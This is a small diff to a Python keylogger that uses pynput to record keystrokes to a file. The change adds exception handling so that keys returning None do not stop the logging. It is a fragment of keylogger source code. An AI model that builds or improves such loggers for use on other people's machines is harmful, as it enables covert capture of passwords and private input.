@@ -14,7 +14,13 @@ def on_press(key):
 		# Alpha-Numeric and special characters have type pynput.keyboard._win32.KeyCode
 		# If such type log them directly
 		if type(key) == pynput.keyboard._win32.KeyCode:
-			f_in.write(key.char)
+			try:
+				f_in.write(key.char)
+
+			# Some keys of type pynput.keyboard._win32.KeyCode return None.
+			# Cant write none type in a file and may cause error. 
+			except Exception:
+				pass
 
 		# For other types like caps_lock log them as specified.
 		else:
